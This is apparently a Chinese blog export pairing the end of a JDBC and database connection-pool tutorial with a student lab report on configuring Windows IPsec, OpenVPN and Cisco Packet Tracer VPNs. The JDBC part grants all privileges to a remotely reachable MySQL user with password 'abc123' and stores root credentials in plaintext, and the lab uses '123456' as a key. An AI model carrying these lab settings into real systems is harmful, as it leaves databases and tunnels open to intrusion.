//1.设置为不自动提交数据 conn.setAutoCommit(false); String sql = \u0026#34;insert into goods(name)values(?)\u0026#34;; PreparedStatement ps = conn.prepareStatement(sql); for(int i = 1;i \u0026lt;= 1000000;i++){ ps.setString(1, \u0026#34;name_\u0026#34; + i); //1.“攒”sql ps.addBatch(); if(i % 500 == 0){ //2.执行 ps.executeBatch(); //3.清空 ps.clearBatch(); } } //2.提交数据 conn.commit(); long end = System.currentTimeMillis(); System.out.println(\u0026#34;花费的时间为：\u0026#34; + (end - start));//1000000条:4978 JDBCUtils.closeResource(conn, ps); } 法四 相比较法三， 只需要提交一次。io 请求减少。 六： 数据库事务 6.1 数据库事务介绍 事务：一组逻辑操作单元,使数据从一种状态变换到另一种状态。\n事务处理（事务操作）：保证所有事务都作为一个工作单元来执行，即使出现了故障，都不能改变这种执行方式。当在一个事务中执行多个操作时，要么所有的事务都被提交(commit)，那么这些修改就永久地保存下来；要么数据库管理系统将放弃所作的所有修改，整个事务**回滚(rollback)**到最初状态。\n为确保数据库中数据的一致性，数据的操纵应当是离散的成组的逻辑单元：当它全部完成时，数据的一致性可以保持，而当这个单元中的一部分操作失败，整个事务应全部视为错误，所有从起始点以后的操作应全部回退到开始状态。\n6.2 事务的ACID属性 原子性（Atomicity） 原子性是指事务是一个不可分割的工作单位，事务中的操作要么都发生，要么都不发生。\n一致性（Consistency） 事务必须使数据库从一个一致性状态变换到另外一个一致性状态。\n隔离性（Isolation） 事务的隔离性是指一个事务的执行不能被其他事务干扰，即一个事务内部的操作及使用的数据对并发的其他事务是隔离的，并发执行的各个事务之间不能互相干扰。\n持久性（Durability） 持久性是指一个事务一旦被提交，它对数据库中数据的改变就是永久性的，接下来的其他操作和数据库故障不应该对其有任何影响。\n6.3.1 数据库的并发问题 对于同时运行的多个事务, 当这些事务访问数据库中相同的数据时, 如果没有采取必要的隔离机制, 就会导致各种并发问题:\n脏读: 对于两个事务 T1, T2, T1 读取了已经被 T2 更新但还没有被提交的字段。之后, 若 T2 回滚, T1读取的内容就是临时且无效的。 不可重复读: 对于两个事务T1, T2, T1 读取了一个字段, 然后 T2 更新了该字段。之后, T1再次读取同一个字段, 值就不同了。 幻读: 对于两个事务T1, T2, T1 从一个表中读取了一个字段, 然后 T2 在该表中插入了一些新的行。之后, 如果 T1 再次读取同一个表, 就会多出几行。 数据库事务的隔离性: 数据库系统必须具有隔离并发运行各个事务的能力, 使它们不会相互影响, 避免各种并发问题。\n一个事务与其他事务隔离的程度称为隔离级别。数据库规定了多种事务隔离级别, 不同隔离级别对应不同的干扰程度, 隔离级别越高, 数据一致性就越好, 但并发性越弱。\n6.3.2 四种隔离级别 数据库提供的4种事务隔离级别：\nOracle 支持的 2 种事务隔离级别：READ COMMITED, SERIALIZABLE。 Oracle 默认的事务隔离级别为: READ COMMITED 。\nMysql 支持 4 种事务隔离级别。Mysql 默认的事务隔离级别为: REPEATABLE READ。\n6.3.3 在MySql中设置隔离级别 每启动一个 mysql 程序, 就会获得一个单独的数据库连接. 每个数据库连接都有一个全局变量 @@tx_isolation, 表示当前的事务隔离级别。\n查看当前的隔离级别:\n1 SELECT @@tx_isolation; 设置当前 mySQL 连接的隔离级别:\n1 set transaction isolation level read committed; 设置数据库系统的全局的隔离级别:\n1 set global transaction isolation level read committed; 补充操作：\n创建mysql数据库用户：\n1 create user tom identified by \u0026#39;abc123\u0026#39;; 授予权限\n1 2 3 4 5 #授予通过网络方式登录的tom用户，对所有库所有表的全部权限，密码设为abc123. grant all privileges on *.* to tom@\u0026#39;%\u0026#39; identified by \u0026#39;abc123\u0026#39;; #给tom用户使用本地命令行方式，授予atguigudb这个库下的所有表的插删改查的权限。 grant select,insert,delete,update on atguigudb.* to tom@localhost identified by \u0026#39;abc123\u0026#39;; 七：DAO及相关实现类 DAO：Data Access Object访问数据信息的类和接口，包括了对数据的CRUD（Create、Retrival、Update、Delete），而不包含任何业务相关的信息。有时也称作：BaseDAO 作用：为了实现功能的模块化，更有利于代码的维护和升级。 【BaseDAO.java】 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 package com.atguigu.bookstore.dao; import java.lang.reflect.ParameterizedType; import java.lang.reflect.Type; import java.sql.Connection; import java.sql.SQLException; import java.util.List; import org.apache.commons.dbutils.QueryRunner; import org.apache.commons.dbutils.handlers.BeanHandler; import org.apache.commons.dbutils.handlers.BeanListHandler; import org.apache.commons.dbutils.handlers.ScalarHandler; /** * 定义一个用来被继承的对数据库进行基本操作的Dao * * @author HanYanBing * * @param \u0026lt;T\u0026gt; */ public abstract class BaseDao\u0026lt;T\u0026gt; { private QueryRunner queryRunner = new QueryRunner(); // 定义一个变量来接收泛型的类型 private Class\u0026lt;T\u0026gt; type; // 获取T的Class对象，获取泛型的类型，泛型是在被子类继承时才确定 public BaseDao() { // 获取子类的类型 Class clazz = this.getClass(); // 获取父类的类型 // getGenericSuperclass()用来获取当前类的父类的类型 // ParameterizedType表示的是带泛型的类型 ParameterizedType parameterizedType = (ParameterizedType) clazz.getGenericSuperclass(); // 获取具体的泛型类型 getActualTypeArguments获取具体的泛型的类型 // 这个方法会返回一个Type的数组 Type[] types = parameterizedType.getActualTypeArguments(); // 获取具体的泛型的类型· this.type = (Class\u0026lt;T\u0026gt;) types[0]; } /** * 通用的增删改操作 * * @param sql * @param params * @return */ public int update(Connection conn,String sql, Object... params) { int count = 0; try { count = queryRunner.update(conn, sql, params); } catch (SQLException e) { e.printStackTrace(); } return count; } /** * 获取一个对象 * * @param sql * @param params * @return */ public T getBean(Connection conn,String sql, Object... params) { T t = null; try { t = queryRunner.query(conn, sql, new BeanHandler\u0026lt;T\u0026gt;(type), params); } catch (SQLException e) { e.printStackTrace(); } return t; } /** * 获取所有对象 * * @param sql * @param params * @return */ public List\u0026lt;T\u0026gt; getBeanList(Connection conn,String sql, Object... params) { List\u0026lt;T\u0026gt; list = null; try { list = queryRunner.query(conn, sql, new BeanListHandler\u0026lt;T\u0026gt;(type), params); } catch (SQLException e) { e.printStackTrace(); } return list; } /** * 获取一个但一值得方法，专门用来执行像 select count(*)...这样的sql语句 * * @param sql * @param params * @return */ public Object getValue(Connection conn,String sql, Object... params) { Object count = null; try { // 调用queryRunner的query方法获取一个单一的值 count = queryRunner.query(conn, sql, new ScalarHandler\u0026lt;\u0026gt;(), params); } catch (SQLException e) { e.printStackTrace(); } return count; } } 之后可以建立相关的表、接口，进而将对应表的DML方法实现 这里以customer表为例子 八：数据库连接池 8.1 数据库连接池技术 为解决传统开发中的数据库连接问题，可以采用数据库连接池技术。\n数据库连接池的基本思想：就是为数据库连接建立一个“缓冲池”。预先在缓冲池中放入一定数量的连接，当需要建立数据库连接时，只需从“缓冲池”中取出一个，使用完毕之后再放回去。\n数据库连接池负责分配、管理和释放数据库连接，它允许应用程序重复使用一个现有的数据库连接，而不是重新建立一个。\n数据库连接池在初始化时将创建一定数量的数据库连接放到连接池中，这些数据库连接的数量是由最小数据库连接数来设定的。无论这些数据库连接是否被使用，连接池都将一直保证至少拥有这么多的连接数量。连接池的最大数据库连接数量限定了这个连接池能占有的最大连接数，当应用程序向连接池请求的连接数超过最大连接数量时，这些请求将被加入到等待队列中。\n工作原理： 数据库连接池技术的优点\n1. 资源重用\n由于数据库连接得以重用，避免了频繁创建，释放连接引起的大量性能开销。在减少系统消耗的基础上，另一方面也增加了系统运行环境的平稳性。\n2. 更快的系统反应速度\n数据库连接池在初始化过程中，往往已经创建了若干数据库连接置于连接池中备用。此时连接的初始化工作均已完成。对于业务请求处理而言，直接利用现有可用连接，避免了数据库连接初始化和释放过程的时间开销，从而减少了系统的响应时间\n3. 新的资源分配手段\n对于多应用共享同一数据库的系统而言，可在应用层通过数据库连接池的配置，实现某一应用最大可用数据库连接数的限制，避免某一应用独占所有的数据库资源\n4. 统一的连接管理，避免数据库连接泄漏\n在较为完善的数据库连接池实现中，可根据预先的占用超时设定，强制回收被占用连接，从而避免了常规数据库连接操作中可能出现的资源泄露\n8.2 多种开源的数据库连接池 JDBC 的数据库连接池使用 javax.sql.DataSource 来表示，DataSource 只是一个接口，该接口通常由服务器(Weblogic, WebSphere, Tomcat)提供实现，也有一些开源组织提供实现： DBCP 是Apache提供的数据库连接池。tomcat 服务器自带dbcp数据库连接池。速度相对c3p0较快，但因自身存在BUG，Hibernate3已不再提供支持。 C3P0 是一个开源组织提供的一个数据库连接池，**速度相对较慢，稳定性还可以。**hibernate官方推荐使用 Proxool 是sourceforge下的一个开源项目数据库连接池，有监控连接池状态的功能，稳定性较c3p0差一点 BoneCP 是一个开源组织提供的数据库连接池，速度快 Druid 是阿里提供的数据库连接池，据说是集DBCP 、C3P0 、Proxool 优点于一身的数据库连接池，但是速度不确定是否有BoneCP快 DataSource 通常被称为数据源，它包含连接池和连接池管理两个部分，习惯上也经常把 DataSource 称为连接池 DataSource用来取代DriverManager来获取Connection，获取速度快，同时可以大幅度提高数据库访问速度。 特别注意： 数据源和数据库连接不同，数据源无需创建多个，它是产生数据库连接的工厂，因此整个应用只需要一个数据源即可。 当数据库访问结束后，程序还是像以前一样关闭数据库连接：conn.close(); 但conn.close()并没有关闭数据库的物理连接，它仅仅把数据库连接释放，归还给了数据库连接池。 8.2.1 Druid（德鲁伊）数据库连接池 Druid是阿里巴巴开源平台上一个数据库连接池实现，它结合了C3P0、DBCP、Proxool等DB池的优点，同时加入了日志监控，可以很好的监控DB池连接和SQL的执行情况，可以说是针对监控而生的DB连接池，可以说是目前最好的连接池之一。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 package com.atguigu.druid; import java.sql.Connection; import java.util.Properties; import javax.sql.DataSource; import com.alibaba.druid.pool.DruidDataSourceFactory; public class TestDruid { public static void main(String[] args) throws Exception { Properties pro = new Properties();\tpro.load(TestDruid.class.getClassLoader().getResourceAsStream(\u0026#34;druid.properties\u0026#34;)); DataSource ds = DruidDataSourceFactory.createDataSource(pro); Connection conn = ds.getConnection(); System.out.println(conn); } } 其中，src下的配置文件为：【druid.properties】\n1 2 3 4 5 6 7 8 9 url=jdbc:mysql://localhost:3306/test?rewriteBatchedStatements=true username=root password=123456 driverClassName=com.mysql.jdbc.Driver initialSize=10 maxActive=20 maxWait=1000 filters=wall 详细配置参数： 配置 缺省 说明 name 配置这个属性的意义在于，如果存在多个数据源，监控的时候可以通过名字来区分开来。 如果没有配置，将会生成一个名字，格式是：”DataSource-” + System.identityHashCode(this) url 连接数据库的url，不同数据库不一样。例如：mysql : jdbc:mysql://10.20.153.104:3306/druid2 oracle : jdbc:oracle:thin:@10.20.149.85:1521:ocnauto username 连接数据库的用户名 password 连接数据库的密码。如果你不希望密码直接写在配置文件中，可以使用ConfigFilter。详细看这里：https://github.com/alibaba/druid/wiki/%E4%BD%BF%E7%94%A8ConfigFilter driverClassName 根据url自动识别 这一项可配可不配，如果不配置druid会根据url自动识别dbType，然后选择相应的driverClassName(建议配置下) initialSize 0 初始化时建立物理连接的个数。初始化发生在显示调用init方法，或者第一次getConnection时 maxActive 8 最大连接池数量 maxIdle 8 已经不再使用，配置了也没效果 minIdle 最小连接池数量 maxWait 获取连接时最大等待时间，单位毫秒。配置了maxWait之后，缺省启用公平锁，并发效率会有所下降，如果需要可以通过配置useUnfairLock属性为true使用非公平锁。 poolPreparedStatements false 是否缓存preparedStatement，也就是PSCache。PSCache对支持游标的数据库性能提升巨大，比如说oracle。在mysql下建议关闭。 maxOpenPreparedStatements -1 要启用PSCache，必须配置大于0，当大于0时，poolPreparedStatements自动触发修改为true。在Druid中，不会存在Oracle下PSCache占用内存过多的问题，可以把这个数值配置大一些，比如说100 validationQuery 用来检测连接是否有效的sql，要求是一个查询语句。如果validationQuery为null，testOnBorrow、testOnReturn、testWhileIdle都不会其作用。 testOnBorrow true 申请连接时执行validationQuery检测连接是否有效，做了这个配置会降低性能。 testOnReturn false 归还连接时执行validationQuery检测连接是否有效，做了这个配置会降低性能 testWhileIdle false 建议配置为true，不影响性能，并且保证安全性。申请连接的时候检测，如果空闲时间大于timeBetweenEvictionRunsMillis，执行validationQuery检测连接是否有效。 timeBetweenEvictionRunsMillis 有两个含义： 1)Destroy线程会检测连接的间隔时间2)testWhileIdle的判断依据，详细看testWhileIdle属性的说明 numTestsPerEvictionRun 不再使用，一个DruidDataSource只支持一个EvictionRun minEvictableIdleTimeMillis connectionInitSqls 物理连接初始化的时候执行的sql exceptionSorter 根据dbType自动识别 当数据库抛出一些不可恢复的异常时，抛弃连接 filters 属性类型是字符串，通过别名的方式配置扩展插件，常用的插件有： 监控统计用的filter:stat日志用的filter:log4j防御sql注入的filter:wall proxyFilters 类型是List，如果同时配置了filters和proxyFilters，是组合关系，并非替换关系 九：Apache-DBUtils实现CRUD操作 9.1 Apache-DBUtils简介 commons-dbutils 是 Apache 组织提供的一个开源 JDBC工具类库，它是对JDBC的简单封装，学习成本极低，并且使用dbutils能极大简化jdbc编码的工作量，同时也不会影响程序的性能。 API介绍： org.apache.commons.dbutils.QueryRunner org.apache.commons.dbutils.ResultSetHandler 工具类：org.apache.commons.dbutils.DbUtils 有了DBUtils可以直接调用API使用增删改查操作了。 9.2 主要API的使用 9.2.1 DbUtils DbUtils ：提供如关闭连接、装载JDBC驱动程序等常规工作的工具类，里面的所有方法都是静态的。主要方法如下： public static void close(…) throws java.sql.SQLException：　DbUtils类提供了三个重载的关闭方法。这些方法检查所提供的参数是不是NULL，如果不是的话，它们就关闭Connection、Statement和ResultSet。 public static void closeQuietly(…): 这一类方法不仅能在Connection、Statement和ResultSet为NULL情况下避免关闭，还能隐藏一些在程序中抛出的SQLEeception。 public static void commitAndClose(Connection conn)throws SQLException： 用来提交连接的事务，然后关闭连接 public static void commitAndCloseQuietly(Connection conn)： 用来提交连接，然后关闭连接，并且在关闭连接时不抛出SQL异常。 public static void rollback(Connection conn)throws SQLException：允许conn为null，因为方法内部做了判断 public static void rollbackAndClose(Connection conn)throws SQLException rollbackAndCloseQuietly(Connection) public static boolean loadDriver(java.lang.String driverClassName)：这一方装载并注册JDBC驱动程序，如果成功就返回true。使用该方法，你不需要捕捉这个异常ClassNotFoundException。 9.2.2 QueryRunner类 该类简单化了SQL查询，它与ResultSetHandler组合在一起使用可以完成大部分的数据库操作，能够大大减少编码量。 QueryRunner类提供了两个构造器： 默认的构造器 需要一个 javax.sql.DataSource 来作参数的构造器 QueryRunner类的主要方法： 更新 public int update(Connection conn, String sql, Object... params) throws SQLException:用来执行一个更新（插入、更新或删除）操作。 \u0026hellip;\u0026hellip; 插入 public \u0026lt;T\u0026gt; T insert(Connection conn,String sql,ResultSetHandler\u0026lt;T\u0026gt; rsh, Object... params) throws SQLException：只支持INSERT语句，其中 rsh - The handler used to create the result object from the ResultSet of auto-generated keys. 返回值: An object generated by the handler.即自动生成的键值 \u0026hellip;. 批处理 public int[] batch(Connection conn,String sql,Object[][] params)throws SQLException： INSERT, UPDATE, or DELETE语句 public \u0026lt;T\u0026gt; T insertBatch(Connection conn,String sql,ResultSetHandler\u0026lt;T\u0026gt; rsh,Object[][] params)throws SQLException：只支持INSERT语句 查询 public Object query(Connection conn, String sql, ResultSetHandler rsh,Object... params) throws SQLException：执行一个查询操作，在这个查询中，对象数组中的每个元素值被用来作为查询语句的置换参数。该方法会自行处理 PreparedStatement 和 ResultSet 的创建和关闭。 测试 1 2 3 4 5 6 7 8 9 10 11 12 13 // 测试添加 @Test public void testInsert() throws Exception { QueryRunner runner = new QueryRunner(); Connection conn = JDBCUtils.getConnection3(); String sql = \u0026#34;insert into customers(name,email,birth)values(?,?,?)\u0026#34;; int count = runner.update(conn, sql, \u0026#34;何成飞\u0026#34;, \u0026#34;he@qq.com\u0026#34;, \u0026#34;1992-09-08\u0026#34;); System.out.println(\u0026#34;添加了\u0026#34; + count + \u0026#34;条记录\u0026#34;); JDBCUtils.closeResource(conn, null); } 1 2 3 4 5 6 7 8 9 10 11 12 13 // 测试删除 @Test public void testDelete() throws Exception { QueryRunner runner = new QueryRunner(); Connection conn = JDBCUtils.getConnection3(); String sql = \u0026#34;delete from customers where id \u0026lt; ?\u0026#34;; int count = runner.update(conn, sql,3); System.out.println(\u0026#34;删除了\u0026#34; + count + \u0026#34;条记录\u0026#34;); JDBCUtils.closeResource(conn, null); } 9.2.3 ResultSetHandler接口及实现类 该接口用于处理 java.sql.ResultSet，将数据按要求转换为另一种形式。\nResultSetHandler 接口提供了一个单独的方法：Object handle (java.sql.ResultSet .rs)。\n接口的主要实现类：\nArrayHandler：把结果集中的第一行数据转成对象数组。 ArrayListHandler：把结果集中的每一行数据都转成一个数组，再存放到List中。 **BeanHandler：**将结果集中的第一行数据封装到一个对应的JavaBean实例中。 **BeanListHandler：**将结果集中的每一行数据都封装到一个对应的JavaBean实例中，存放到List里。 ColumnListHandler：将结果集中某一列的数据存放到List中。 KeyedHandler(name)：将结果集中的每一行数据都封装到一个Map里，再把这些map再存到一个map里，其key为指定的key。 **MapHandler：**将结果集中的第一行数据封装到一个Map里，key是列名，value就是对应的值。 **MapListHandler：**将结果集中的每一行数据都封装到一个Map里，然后再存放到List **ScalarHandler：**查询单个值对象 测试\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 /* * 测试查询:查询一条记录 * * 使用ResultSetHandler的实现类：BeanHandler */ @Test public void testQueryInstance() throws Exception{ QueryRunner runner = new QueryRunner(); Connection conn = JDBCUtils.getConnection3(); String sql = \u0026#34;select id,name,email,birth from customers where id = ?\u0026#34;; // BeanHandler\u0026lt;Customer\u0026gt; handler = new BeanHandler\u0026lt;\u0026gt;(Customer.class); Customer customer = runner.query(conn, sql, handler, 23); System.out.println(customer);\tJDBCUtils.closeResource(conn, null); } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 /* * 测试查询:查询多条记录构成的集合 * * 使用ResultSetHandler的实现类：BeanListHandler */ @Test public void testQueryList() throws Exception{ QueryRunner runner = new QueryRunner(); Connection conn = JDBCUtils.getConnection3(); String sql = \u0026#34;select id,name,email,birth from customers where id \u0026lt; ?\u0026#34;; // BeanListHandler\u0026lt;Customer\u0026gt; handler = new BeanListHandler\u0026lt;\u0026gt;(Customer.class); List\u0026lt;Customer\u0026gt; list = runner.query(conn, sql, handler, 23); list.forEach(System.out::println); JDBCUtils.closeResource(conn, null); } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 /* * 自定义ResultSetHandler的实现类 */ @Test public void testQueryInstance1() throws Exception{ QueryRunner runner = new QueryRunner(); Connection conn = JDBCUtils.getConnection3(); String sql = \u0026#34;select id,name,email,birth from customers where id = ?\u0026#34;; ResultSetHandler\u0026lt;Customer\u0026gt; handler = new ResultSetHandler\u0026lt;Customer\u0026gt;() { @Override public Customer handle(ResultSet rs) throws SQLException { System.out.println(\u0026#34;handle\u0026#34;); //\treturn new Customer(1,\u0026#34;Tom\u0026#34;,\u0026#34;tom@126.com\u0026#34;,new Date(123323432L)); if(rs.next()){ int id = rs.getInt(\u0026#34;id\u0026#34;); String name = rs.getString(\u0026#34;name\u0026#34;); String email = rs.getString(\u0026#34;email\u0026#34;); Date birth = rs.getDate(\u0026#34;birth\u0026#34;); return new Customer(id, name, email, birth); } return null; } }; Customer customer = runner.query(conn, sql, handler, 23); System.out.println(customer); JDBCUtils.closeResource(conn, null); } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 /* * 如何查询类似于最大的，最小的，平均的，总和，个数相关的数据， * 使用ScalarHandler * */ @Test public void testQueryValue() throws Exception{ QueryRunner runner = new QueryRunner(); Connection conn = JDBCUtils.getConnection3(); //测试一： //\tString sql = \u0026#34;select count(*) from customers where id \u0026lt; ?\u0026#34;; //\tScalarHandler handler = new ScalarHandler(); //\tlong count = (long) runner.query(conn, sql, handler, 20); //\tSystem.out.println(count); //测试二： String sql = \u0026#34;select max(birth) from customers\u0026#34;; ScalarHandler handler = new ScalarHandler(); Date birth = (Date) runner.query(conn, sql, handler); System.out.println(birth); JDBCUtils.closeResource(conn, null); } ","permalink":"http://www.reus09.top/posts/tech/jdbc/","summary":"一：JDBC概述 1.1 数据的持久化 持久化(persistence)：把数据保存到可掉电式存储设备中以供之后使用。大多数情况下，特别是企业级应用，","title":"Jdbc"},{"content":"VPN配置实验 0x01 实验内容 在Windows IPSEC配置实验中，通过抓包工具抓取IKE SA和IPSEC SA建立过程的数据包，并进行分析；思考：IKE密钥协商过程是否存在安全威胁。 采用IPSec隧道模式在两台用作网关的计算机之间配置VPN，抓取两台计算机之间的数据包，查看数据的机密性，提交实验步骤和分析结果。(提示：可以使用ping\\net send \\telnet等命令进行对比验证) 配置OPENVPN，利用2至3台主机独立完成虚拟专网的搭建，并验证虚拟专网的安全性（用抓包工具分析，提示：可以使用ping\\net send \\telnet等命令进行对比验证）。 PacketTracer里VPN配置实验。（选做） 0x02 Windows IPSEC配置 配置环境：windows xp \u0026amp; windows 7 查看win xp和win 7的IP地址 windows xp : 192.168.195.131 windows 7 : 192.168.195.176 2.1 windows xp IPSEC配置 打开windows xp虚拟机，通过secpol.msc打开本地安全设置\n在IP安全策略下右键，创建安全策略\n设置配置名称为reus09\n激活默认响应规则 身份认证方法采用此字符串用来保护密钥交换，输入123456 回到原来窗口，鼠标右键，指派\n鼠标右键，属性，添加规则并进行相应的配置\n选择此规则不指定隧道\n选择所有网络连接\n身份验证方法采用此字符串用来保护密钥交换，输入字符串：123456\nIP筛选列表选择所有IP通讯量\n筛选器操作选择需要安全\n点击下一步完成\n至此，Windows xp下的IPSEC配置完成，操作过程中没有报错。\n2.2 windows 7 IPSEC配置 以同样的方式配置windows 7下的IPSEC，这里与windows xp配置大致相同，截图只用于说明不同点。通过secpol.msc打开windows 7本地安全设置 在IP安全策略下右键，创建安全策略 设置配置名称为reus09（个人随意），由于激活默认响应规则仅限于windows早期版本，故不选择激活默认响应规则，过程中，没有身份认证选择 点击默认设置，一直到属性窗口，添加规则：选择此规则不指定隧道、选择所有网络连接、在IP筛选列表中点击添加，名称为新IP筛选列表，并点击添加，之后选择默认操作 选择刚刚建立的IP筛选列表，点击下一步 选择添加IP筛选器操作, 选择协商安全,继续默认操作 选择刚刚建立的新筛选器操作，点击下一步 身份验证方法采用此字符串用来保护密钥交换，输入字符串：123456(与上面的相同) 单击下一步，选择默认操作直至筛选器配置完成 回到原来窗口，鼠标右键，分配，至此，Windows 7下的IPSEC配置完成，操作过程中没有报错 2.3 开始通信 关闭win 7的IPSEC服务 使用win 7 ping win xp，请求超时，ping不通 对通信过程进行抓包，可以看到win 7一直请求IPsec SA但总不成功 重新开启win 7的IPSEC服务 2.3.1 默认安全策略 使用win 7重新ping win xp，发现成功ping通 对通信过程进行抓包，由于此时win xp和win7都采用的是默认的esp加密，所以抓包显示的是esp包 2.3.2 仅AH通信,不经过ESP加密 Win 7和win xp都设置仅AH通信，不经过ESP加密 window 7 windows xp 继续使用win 7 ping win xp 对通信过程进行抓包，发现没有ESP加密后数据包格式为ICMP，数据为abcdef 2.3.3 Win 7和win xp仅esp认证 windows 7 windows xp 可以看到没有esp加密后的数据是abcdefg 同时也可以注意到开启esp加密之后的esp加密的数据被加密隐藏了 2.3.4 分析IKE SA和IPSEC SA建立过程 要建立IPSec连接，首先要协商一个IKE SA，然后在IKE SA的基础上协商IPSec SA IKE SA建立分为三个阶段 SA交换，协商确认有关安全策略。该过程进行安全协商 密钥交换阶段，主要交换密钥Diffie-Hellman公共值。数据包中的Key Exchange用于交换各自加密生成的主密钥；Nonce使用了随机数，防止重放攻击；加密所用的密钥为ipsec中设定的预共享密钥； NAT-D为双方的ip+端口的Hash值。 ID信息和认证数据交换，进行身份认证，对第一阶段交换内容的认证。 IPSec SA建立分为两个阶段，都是加密数据，无法查看。用到了Quick-Mode，目的是在两个对等体间协商一组一致的参数来创建IPSec SA，用于真实数据的加解密，并且在此进行PFS，PFS及在Quick-Mode重新做DH的交换，产生新的密钥用于IPSec数据的加密。 2.3.5 思考 Q：IKE密钥协商过程是否存在安全威胁？ A：IPSec密钥交换过程分为两个独立阶段。第一阶段通信双方彼此建立一个通过身份认证和安全保护的隧道，称为ISAKMP SA。只要ISAKMP SA建立起来，所有发起方和应答方之间的IKE通信信息都通过加密、完整性检查和认证的方法受到保护。第二阶段的建立是为特定的Internet安全协议(如IPSec等)创建安全关联(IPSec SA)。IKE第一阶段的目的是建立一个安全隧道，使得第二阶段的协商可以秘密地进行。两台主机之间可以同时建立多个ISAKMP SA，一个ISAKMP SA也可以创建多个IPSec SA，ISAKMP SA的结束不会影响它创建的IPSec SA发生作用。这种密钥协商过程是存在着漏洞的，可以通过中间人攻击和拒绝服务攻击实现漏洞利用。 0x03 配置OPENVPN 4.1 网络环境 服务器端 Windows xp: 192.168.195.131 client IP :192.168.195.131 4.2 环境修改 把 easy-rsa 目录下的 vars.bat.sample 改名为 vars.bat，并且修改其内容\n把 easy-rsa 下的 openssl.cnf.sample 改成 openssl.cnf。\n然后进入 cmd.exe\n生成 Root CA\n格式: build-ca.bat\n输出: keys/ca.crt keys/ca.key\n生成 dh1024.pem 文件，Server 使用 TLS 必须使用的一个文件。\n格式: build-dh.bat\n输出: keys/dh1024.pem\n下面生成服务端证书、客户端证书和 TA 证书：\n下面开始生成 Server 使用的证书了：\n格式: build-key-server.bat 输出: keys/.crt .csr .key\n下面开始为 client 办法证书：\n格式: build-key.bat 输出: keys/.crt keys/.csr keys/.key\n下面生成 ta.key 文件\n格式: openvpn \u0026ndash;genkey \u0026ndash;secret keys/ta.key\n输出: keys/ta.key\n服务端与客户端的配置:\nserver.opvn配置 把 easy-rsa\\keys\\下的 ca.crt server.crt server.key ta.key dh1024.pem复制到 server.ovpn 所在目录。 可以看到server端连接：VPN的IP为10.8.0.0 Client\nclient.opvn配置 服务端主机 easy-rsa/keys 下的 ca.crt client.crt client.key ta.key 一起放到客户机的\u0026lt;OPENVPN_HOME\u0026gt;\\config 目录下。 连接效果图 4.3 连接测试 0x04 PacketTrace VPN配置 5.1 实验环境 系统：Windows xp 软件工具：思科官方模拟器Packet Tracer 5.3 模拟实体：2台cisco2800系列路由器、2台24端口以太网交换机和若干PC电脑 5.2 初始化路由器 安装Packet Tracer 5.3\n配置安全策略\n新建一条安全策略PacketTracer，添加IP安全规则，隧道方式为不指定隧道，网络类型选择所有网络连接，身份验证方法选择用字符串保护密钥交换，输入：123456；进入IP筛选器列表的配置项，设置一个新的IP筛选器列表，新建一个IP筛选器，将我的IP地址作为源地址，将任何IP地址作为目标地址，在选择协议类型中选中任意，新建一个筛选操作，设置为协商安全，选中不和不支持IPSec的计算机通讯，以要求必须在IPSec基础上进行连接，IP通讯安全设施中选择选择自定义，然后点击设置选择如下图，选择默认直至配置完成 初始化配置路由器\n打开cisco模拟器，在模拟器窗口工具栏下选择file--new。在左下角设备栏选取路由器。 将cisco2811路由器拖到工作区域，单击工作区域的路由器图标，选择CLI项，弹出如图所示界面 进入路由器特权模式配置路由器网卡IP，输入命令如下\n1 2 3 4 5 6 7 8 9 10 11 Router\u0026gt;enable\t//进入特权模式，只有在特权模式下才可以对路由器进行配置 Router#configure terminal\t//进入配置状态，通过端口进行配置 Router(config)# interface fastEthernet 0/0\t//进入端口f0/0 Router(config-if)#ip address 10.0.0.1 255.255.255.0\t#配置网卡f0/0的ip地址和子网掩码 Router(config-if)#no shutdown\t//开启端口f0/0 Router(config-if)#end\t//返回特权模式 Router#configure terminal\t//进入配置状态，通过端口进行配置 Router(config)# interface fastEthernet 0/1 //进入端口f0/1 Router(config-if)#ip address 192.168.1.1 255.255.255.0 //配置网卡f0/1的ip地址和子网掩码 Router(config-if)#no shutdown\t//开启端口f0/1 Router(config-if)#end\t//返回特权模式 初始配置router 0完成，根据router 0的配置过程完成router 1的配置，其中router 1的f0/0端口IP为10.0.0.2/24, router 1的f0/1端口的IP地址为192.168.2.1/24\n配置完成后，点击选择将router 0和router 1的f0/0端口连接\n5.3 搭建网络环境 在模拟器左下角选择PC\n拖到绘图工作区，双击PC图标，选择Desktop，如图所示 选择IP Configuration，配置PC的IP地址和子网掩码，如图所示\n重复上述操作，配置六台PC，它们的IP地址分别为\n192.168.1.10 192.168.1.20 192.168.1.30 192.168.2.10 192.168.2.20 192.168.2.30 子网掩码全为255.255.255.0，前三台网关为192.168.1.1，后三台网关为192.168.2.1\n选取交换机\n将路由器于交换机相连，将交换机于PC相连；最终完成如图所示的网络图 5.4 配置路由 在路由器中配置路由，使路由器两端的网络互通\n配置router 0，双击router 0图标，选择CLI项，进入路由器配置窗口，输入命令如下\n1 2 3 4 5 Router\u0026gt;en Router#configure terminal Router(config)# ip route 0.0.0.0 0.0.0.0 fastEthernet 0/0 //配置内网访问外部网络的出口路由 Router(config)#ip route 192.168.1.0 255.255.255.0 fastEthernet 0/1 //配置外部访问内部网络入口路由 Router(config)#end 配置router 1，双击router 1图标，选择CLI项，进入路由器配置窗口，输入命令如下\n1 2 3 4 5 Router\u0026gt;en Router#configure terminal Router(config)# ip route 0.0.0.0 0.0.0.0 fastEthernet 0/0 //配置内网访问外部网络的出口路由 Router(config)#ip route 192.168.2.0 255.255.255.0 fastEthernet 0/1 //配置外部访问内部网络入口路由 Router(config)#end 5.5 测试网络互通性 双击PC0图标，在弹出的对话框中，选择Desktop，选择Command 